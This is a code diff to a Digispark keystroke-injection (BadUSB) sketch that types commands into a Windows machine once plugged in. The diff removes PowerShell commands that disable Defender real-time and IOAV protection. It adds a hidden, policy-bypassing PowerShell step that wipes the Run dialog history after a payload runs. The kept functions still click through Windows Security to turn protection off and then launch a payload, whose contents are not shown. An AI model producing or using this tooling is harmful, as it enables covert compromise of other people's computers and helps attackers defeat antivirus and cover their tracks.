@@ -23,34 +23,23 @@ void digiEnd() {
   }
 }
 
-void startCmd() {
-  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
-  DigiKeyboard.delay(250);
-  DigiKeyboard.print("cmd Start-Process powershell -Verb runAs");
-  DigiKeyboard.delay(200);
+void clearHistory_RUN() {
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("powershell -windowstyle hidden -Exec Bypass Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue");
+  DigiKeyboard.delay(100);  
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000); 
-}
-
-void disableAV() {
-  DigiKeyboard.print("powershell");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);  
-  DigiKeyboard.print("Set-MpPreference -DisableIOAVProtection $true");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
+  DigiKeyboard.delay(500);
 }
 
 void disableAV_TAB() {
-  DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.print("virus & threat protection");
+  DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(3000);
+  DigiKeyboard.delay(2000);
   DigiKeyboard.sendKeyStroke(KEY_TAB);
   DigiKeyboard.sendKeyStroke(KEY_TAB);
   DigiKeyboard.sendKeyStroke(KEY_TAB);
@@ -59,15 +48,14 @@ void disableAV_TAB() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(200);
   DigiKeyboard.sendKeyStroke(KEY_SPACE);
-  DigiKeyboard.delay(2000);
+  DigiKeyboard.delay(1500);
   DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
   DigiKeyboard.delay(500);
-  
 }
 
-void executePayload() {
+void executePayload() {  
   DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
@@ -77,14 +65,14 @@ void executePayload() {
   DigiKeyboard.delay(300);
 }
 
-/* ------------- main ------------- */
-
 void setup() {
   digiBegin();
   
   disableAV_TAB();
 
   executePayload();
+
+  clearHistory_RUN();             
   
   digiEnd();
 }
